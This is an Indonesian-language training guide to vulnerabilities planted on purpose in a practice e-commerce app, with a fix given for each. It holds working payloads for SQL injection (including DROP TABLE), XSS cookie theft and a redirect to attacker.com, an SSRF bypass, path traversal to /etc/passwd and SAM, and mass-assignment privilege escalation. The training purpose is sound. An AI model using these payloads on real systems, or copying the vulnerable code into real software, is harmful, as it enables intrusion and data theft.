# 🔒 Security Vulnerabilities Guide

Dokumentasi kerentanan yang sengaja ditanam di PasarKita untuk training penetration testing.

---

## 1. SQL Injection

### Lokasi
- Endpoint: `GET /api/products?q=<query>`
- File: `app.py` - fungsi `api_products()`

### Deskripsi
Query search menggunakan string concatenation langsung tanpa prepared statement:

```python
# VULNERABLE CODE
if search:
    query += f" AND (name LIKE '%{search}%' OR description LIKE '%{search}%')"
```

### Severity
🔴 **HIGH**

### Cara Exploit
1. Buka halaman beranda atau `/api/products?q=test`
2. Inject SQL query:
   ```
   ' OR '1'='1
   ' UNION SELECT * FROM users --
   '; DROP TABLE products; --
   ```

### Contoh Payload
```
/api/products?q=' OR '1'='1' --

/api/products?q=a' UNION SELECT id, username, email, 'cat1' as cat FROM users --
```

### Cara Fix
Gunakan parameterized query:
```python
if search:
    query += " AND (name LIKE ? OR description LIKE ?)"
    params.extend([f"%{search}%", f"%{search}%"])
```

---

## 2. Cross-Site Scripting (XSS)

### Lokasi
- Endpoint: `POST /api/comments/add`
- File: `app.py` - fungsi `api_add_comment()`
- Tampilan: `/product/<id>` - comments tidak di-escape

### Deskripsi
Review produk disimpan langsung tanpa sanitasi HTML:

```python
# VULNERABLE CODE
db.execute('''INSERT INTO comments (product_id, user_id, rating, comment)
              VALUES (?, ?, ?, ?)''',
           (product_id, g.user_id, rating, comment))
```

Comment ditampilkan dengan `.innerHTML` di JavaScript.

### Severity
🔴 **HIGH**

### Cara Exploit
1. Buka halaman produk (misal `/product/1`)
2. Scroll ke bagian "Ulasan Produk"
3. Masukkan di kolom komentar:
   ```html
   <img src=x onerror="alert('XSS')">
   ```
   atau
   ```html
   <script>alert('XSS')</script>
   ```

### Contoh Payload
```html
<!-- Alert -->
<img src=x onerror="alert('XSS Vulnerability')">

<!-- Steal Cookie -->
<img src=x onerror="fetch('/api/steal?cookie='+document.cookie)">

<!-- Redirect -->
<script>window.location='http://attacker.com'</script>

<!-- HTML Injection -->
<b>Produk sangat bagus!</b>
<script>console.log('XSS')</script>
```

### Cara Fix
Sanitize HTML atau escape output:
```python
import html
comment = html.escape(comment)  # Saat save
# atau
comment.replace('<', '&lt;').replace('>', '&gt;')
```

---

## 3. IDOR (Insecure Direct Object Reference)

### Lokasi 1: User Profile
- Endpoint: `GET /api/users/<id>`
- File: `app.py` - fungsi `api_user_detail()`

### Lokasi 2: Order Detail
- Endpoint: `GET /api/orders/<id>`
- File: `app.py` - fungsi `api_order_detail()`

### Deskripsi
Endpoint tidak melakukan authorization check. User dapat mengakses data user/order lain hanya dengan mengganti ID:

```python
# VULNERABLE CODE - Tidak ada pengecekan ownership
user = db.execute(
    'SELECT ... FROM users WHERE id = ?',
    (user_id,)
).fetchone()
```

### Severity
🔴 **HIGH**

### Cara Exploit

#### A. Access User Profile
1. Login dengan user `andi`
2. Buka browser console atau gunakan curl:
   ```bash
   curl http://127.0.0.1:5000/api/users/1
   curl http://127.0.0.1:5000/api/users/2
   curl http://127.0.0.1:5000/api/users/3
   ```
3. Ubah ID untuk melihat data user lain

#### B. Access Order Detail
1. Login dengan user `andi`
2. Buat order atau gunakan order ID yang diketahui
3. Akses order orang lain:
   ```bash
   curl http://127.0.0.1:5000/api/orders/2
   curl http://127.0.0.1:5000/api/orders/3
   ```

### Cara Fix
Tambahkan authorization check:
```python
# FIX: Check ownership
user = db.execute(
    'SELECT id, username FROM users WHERE id = ?',
    (user_id,)
).fetchone()

if user is None or user['id'] != g.user_id:
    return jsonify({'error': 'Unauthorized'}), 403
```

---

## 4. Mass Assignment

### Lokasi
- Endpoint: `POST /api/profile/update`
- File: `app.py` - fungsi `api_profile_update()`

### Deskripsi
Endpoint menerima field `role` dari client, memungkinkan user biasa menjadi admin:

```python
# VULNERABLE CODE
if 'role' in data:
    db.execute('UPDATE users SET role = ? WHERE id = ?', 
               (data['role'], g.user_id))
```

### Severity
🔴 **CRITICAL**

### Cara Exploit
1. Login dengan user `andi`
2. Buka browser console:
   ```javascript
   fetch('/api/profile/update', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
           email: 'andi@pasar.test',
           role: 'admin'
       })
   })
   ```
3. Refresh halaman, sekarang `andi` adalah admin

Atau gunakan curl:
```bash
curl -X POST http://127.0.0.1:5000/api/profile/update \
  -H "Content-Type: application/json" \
  -d '{"email":"andi@pasar.test","role":"admin"}'
```

### Cara Fix
Whitelist field yang boleh di-update:
```python
UPDATABLE_FIELDS = ['email', 'full_name', 'phone', 'address', 'city', 'postal_code']

for field in UPDATABLE_FIELDS:
    if field in data:
        db.execute(f'UPDATE users SET {field} = ? WHERE id = ?',
                  (data[field], g.user_id))

# Jangan accept 'role' dari client
if 'role' in data:
    return jsonify({'error': 'Cannot update role'}), 403
```

---

## 5. Business Logic Issues

### A. Unlimited Coupon Usage

**Lokasi:** `POST /api/checkout`

**Deskripsi:** Coupon dapat dipakai berkali-kali tanpa limit.

**Cara Exploit:**
1. Buat order dengan coupon `WELCOME50` (50% diskon)
2. Buat order lagi dengan coupon sama
3. Coupon tetap bekerja (seharusnya max uses = 1 per user)

**Fix:**
```python
# Cek penggunaan coupon per user
existing_use = db.execute(
    'SELECT id FROM orders WHERE user_id = ? AND coupon_code = ?',
    (g.user_id, coupon_code)
).fetchone()

if existing_use:
    return jsonify({'error': 'Coupon already used'}), 400
```

### B. Quantity Manipulation

**Lokasi:** `POST /api/checkout`

**Deskripsi:** Quantity tidak di-validasi ulang saat checkout. User bisa add 999 items dari 10 stok.

**Cara Exploit:**
1. Buka product dengan stock 10
2. Add ke cart dengan quantity 999
3. Lanjut ke checkout - akan berhasil

**Fix:** Validasi stock ulang:
```python
product = db.execute('SELECT stock FROM products WHERE id = ?', 
                     (item['product_id'],)).fetchone()
if item['quantity'] > product['stock']:
    return jsonify({'error': 'Insufficient stock'}), 400
```

### C. Price Manipulation

**Lokasi:** Client side manipulation

**Deskripsi:** Price dihitung di server, tapi bisa dimanipulasi via race condition atau timing attack.

---

## 6. File Upload Vulnerabilities

### Lokasi
- Endpoint: `POST /api/upload`
- Download: `GET /uploads/<filename>`
- File: `app.py` - fungsi `api_upload()` dan `download_file()`

### A. Weak MIME Type Validation

**Vulnerability:** MIME type dapat dipalsukan:
```python
# VULNERABLE: Hanya check content-type header
if file.content_type not in ['image/png', 'image/jpeg']:
    pass  # Tidak ada validasi yang ketat
```

**Exploit:** Upload file .exe dengan MIME type image/jpeg.

### B. Path Traversal

**Vulnerability:** Filename tidak di-validate proper:
```python
# VULNERABLE: Path traversal possible
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
if os.path.exists(filepath):
    return send_file(filepath)
```

**Exploit:**
```
/uploads/../../etc/passwd
/uploads/../../../windows/system32/config/sam
```

### Severity
🔴 **MEDIUM/HIGH**

### Cara Exploit
1. Upload file gambar
2. Coba akses dengan path traversal:
   ```
   GET /uploads/../app.py
   GET /uploads/../database.py
   ```

### Cara Fix
```python
# Use secure filename
from werkzeug.utils import secure_filename
filename = secure_filename(file.filename)

# Validate extension properly
ALLOWED_EXT = {'png', 'jpg', 'jpeg', 'gif'}
if not '.' in filename or filename.rsplit('.', 1)[1].lower() not in ALLOWED_EXT:
    return jsonify({'error': 'Invalid file type'}), 400

# Prevent path traversal
if '..' in filename or '/' in filename:
    return jsonify({'error': 'Invalid filename'}), 400
```

---

## 7. Path Traversal (File Download)

### Lokasi
- Endpoint: `GET /api/file?name=`
- File: `app.py` - fungsi `download_file()`

### Deskripsi
Path tidak di-validate, user bisa akses file apapun:

```python
# VULNERABLE: Tidak ada validasi path
filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
if os.path.exists(filepath):
    return send_file(filepath)
```

### Severity
🔴 **HIGH**

### Cara Exploit
```bash
curl http://127.0.0.1:5000/uploads/../../app.py
curl http://127.0.0.1:5000/uploads/../../database.py
```

### Cara Fix
```python
import os

UPLOAD_FOLDER = os.path.abspath('uploads')

def download_file(filename):
    filepath = os.path.abspath(os.path.join(UPLOAD_FOLDER, filename))
    
    # Ensure filepath is within UPLOAD_FOLDER
    if not filepath.startswith(UPLOAD_FOLDER):
        return jsonify({'error': 'Access denied'}), 403
    
    if os.path.exists(filepath):
        return send_file(filepath)
    
    return jsonify({'error': 'File not found'}), 404
```

---

## 8. SSRF (Server-Side Request Forgery)

### Lokasi
- Endpoint: `GET /api/fetch?url=`
- File: `app.py` - fungsi `api_fetch()`

### Deskripsi
Endpoint melakukan fetch ke URL yang di-specify user (dengan batasan terbatas):

```python
# VULNERABLE: SSRF dengan pembatasan lemah
if host not in internal_services:
    return jsonify({'error': 'Service unavailable'}), 403

# Bisa bypass dengan URL encoding atau teknik lain
```

### Severity
🟡 **MEDIUM** (dibatasi untuk internal service dummy)

### Cara Exploit
```bash
# Attempt bypass:
curl "http://127.0.0.1:5000/api/fetch?url=http://127.0.0.1:5000/api/products"

# URL encoding bypass:
curl "http://127.0.0.1:5000/api/fetch?url=http://127.0.0.1@attacker.com"
```

### Cara Fix
```python
from urllib.parse import urlparse
import re

ALLOWED_HOSTS = ['127.0.0.1', 'localhost', 'internal-service']
ALLOWED_DOMAINS = ['internal-service']

parsed = urlparse(url)
host = parsed.hostname

# Strict whitelist
if host not in ALLOWED_HOSTS and not any(host.endswith(d) for d in ALLOWED_DOMAINS):
    return jsonify({'error': 'Host not allowed'}), 403

# Prevent private IP ranges
private_ips = ['10.', '172.16.', '192.168.', '127.', '169.254.', '::1']
if any(host.startswith(ip) for ip in private_ips):
    return jsonify({'error': 'Private IP not allowed'}), 403
```

---

## 9. Weak Rate Limiting

### Lokasi
- Endpoint: `POST /api/rate-test`
- File: `app.py` - fungsi `api_rate_test()`

### Deskripsi
Tidak ada rate limiting sama sekali. Endpoint selalu return success.

### Severity
🟡 **MEDIUM**

### Cara Exploit
```bash
# Test rate limiting dengan banyak request
for i in {1..100}; do
  curl http://127.0.0.1:5000/api/rate-test
done
```

### Cara Fix
Gunakan Flask-Limiter:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/rate-test', methods=['POST', 'GET'])
@limiter.limit("10 per minute")
def api_rate_test():
    return jsonify({'status': 'success'}), 200
```

---

## 10. Information Disclosure

### Lokasi 1: Database Error Messages
- Endpoint: `GET /api/products?q=<invalid SQL>`
- Kembali dengan error detail yang terlalu verbose

### Lokasi 2: Error Pages
- Exception handling menampilkan traceback lengkap

### Deskripsi
Error message mengungkapkan informasi sistem:

```python
# VULNERABLE: Reveal database error
except Exception as e:
    return jsonify({'error': f'Database error: {str(e)}'}), 500
```

### Severity
🟡 **MEDIUM**

### Cara Exploit
1. Trigger SQL error:
   ```
   /api/products?q=') OR (1
   ```
2. Lihat error message yang terungkap

### Cara Fix
```python
# Generic error messages only
except Exception as e:
    logger.error(f'Database error: {str(e)}')  # Log untuk admin
    return jsonify({'error': 'Database error occurred'}), 500
```

---

## 11. Session & Authorization Issues

### A. Weak Session Management
- Session token tidak di-encrypt
- Session expiry tidak divalidasi ketat

### B. Authorization Bypass
- Beberapa endpoint admin tidak full-protected
- Middleware decorator bisa di-bypass jika tidak careful

### Severity
🟡 **MEDIUM**

---

## 12. JWT Token Issues

### Lokasi
- Endpoint: `POST /api/auth/token`
- Token tidak di-validate ketat

### Deskripsi
"JWT" yang di-generate adalah token sederhana, bukan real JWT.

---

## Testing Tools

### Command Line Tools
```bash
# SQL Injection
sqlmap -u "http://127.0.0.1:5000/api/products?q=test" --batch

# Burp Suite
# Import target di Burp dan lakukan manual testing

# OWASP ZAP
zaproxy -cmd -quickurl http://127.0.0.1:5000 -quickout report.html
```

### API Testing
```bash
# Curl
curl http://127.0.0.1:5000/api/users/1

# Postman
# Import koleksi API dan test satu per satu

# Python Requests
import requests
r = requests.get('http://127.0.0.1:5000/api/users/1')
print(r.json())
```

---

## ✅ Testing Checklist

- [ ] SQL Injection pada search
- [ ] XSS pada review produk
- [ ] IDOR pada profile & orders
- [ ] Mass assignment di profile update
- [ ] Unlimited coupon usage
- [ ] Quantity manipulation di checkout
- [ ] File upload bypass
- [ ] Path traversal di file download
- [ ] SSRF endpoint testing
- [ ] Rate limit testing
- [ ] Information disclosure
- [ ] Authorization bypass
- [ ] Session handling issues
- [ ] Cookie manipulation

---

## 🚨 Severity Levels

- 🔴 **CRITICAL**: Immediate patch required
- 🔴 **HIGH**: Patch urgently
- 🟡 **MEDIUM**: Patch soon
- 🟢 **LOW**: Patch when possible

---

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

**Remember: Learn responsibly. Use for education only.** 🎓
